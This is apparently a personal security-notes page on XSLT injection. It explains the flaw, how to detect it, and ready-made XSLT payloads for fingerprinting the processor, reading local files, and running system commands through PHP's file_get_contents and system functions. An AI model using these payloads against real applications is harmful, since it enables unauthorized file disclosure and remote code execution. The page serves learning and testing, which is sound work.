---
Primary_category: "[[WEB ATTACKS]]"
title: "XSLT INJECTION"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WEB ATTACKS]]

#### *Theory*

***XSLT Injection*** is a vulnerability that occurs when user-controlled input is incorporated into a *XSLT* stylesheet or expression that is later interpreted by the *XSLT Processor*

By injecting or modifying *XSLT* logic, an attacker may abuse the processor's available functionality to ***[[#Information Disclosure|disclose information]]***, ***[[#Local File Inclusion|read local files]]*** or, in some configurations, ***[[#Remote Code Execution|achieve remote code execution]]***

*XSLT* basically takes *XML* data as input and processes it to generate content in another format, such as *HTML*, plain text, *PDF* and so on

---

#### *Identifying an XSLT Injection*

Let's suppose that we are dealing with a web application that displays information stored in an *XML* document using *XSLT* processing

Furthermore, this web application expects the user to enter valid data to display more information, such as a valid *username*

![[XSLT INJECTION-20260918195232107.webp|450]]

> ***Zoom in***

Once we enter an string, it's processed by an *XSLT engine* and reflected in the response

![[XSLT INJECTION-20260918195711848.webp|450]]

> ***Zoom in***

Therefore, it may be vulneable to *XSLT Injection* if our name is inserted without sanitization before *XSLT* processing

To verify this, we can inject a broken *XML* tag **`<`** to try to cause an error in the web application

![[XSLT INJECTION-20260918200118116.webp|450]]

> ***Zoom in***

---

#### *Exploiting an XSLT Injection*

##### *Information Disclosure*

- ***Basic Information about the XSLT Processor***

```bash
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

> [!DANGER]- *Oneliner*
>
> ```bash
> Version: <xsl:value-of select="system-property('xsl:version')" /> <br/> Vendor: <xsl:value-of select="system-property('xsl:vendor')" /> <br/> Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /> <br/> Product Name: <xsl:value-of select="system-property('xsl:product-name')" /> <br/> Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
> ```
>

![[XSLT INJECTION-20260918200628621.webp|450]]

> ***Zoom in***

In this case, we know that the web applications relies on the *libxslt* library and supports *XSLT version 1.0*

##### *Local File Inclusion*

> ***The payload effectiveness depends on the XSLT version and the configuration of the XSLT library***

- ***XSLT Version 2.0 and higher***

```bash
<xsl:value-of select="unparsed-text('<FILE>', 'utf-8')" />
```

- ***XSLT Version 1.0***

If the *XSLT* library is configured to support server-side programming language functions, we can call them to retrieve a file content

> ***e.g. PHP → *** **`file_get_contents()`**

```bash
<xsl:value-of select="php:function('file_get_contents','<FILE>')" />
```

![[XSLT INJECTION-20260918202115844.webp|450]]

> ***Zoom in***

##### *Remote Code Execution*

As with ***[[#Local File Inclusion]]***, as long as the *XSLT Processor* supports server-side programming language functions, we can call specific functions to execute system commands

> ***e.g. PHP → *** **`system()`**

```bash
<xsl:value-of select="php:function('system','<COMMAND>')" />
```

![[XSLT INJECTION-20260918202521191.webp|450]]

> ***Zoom in***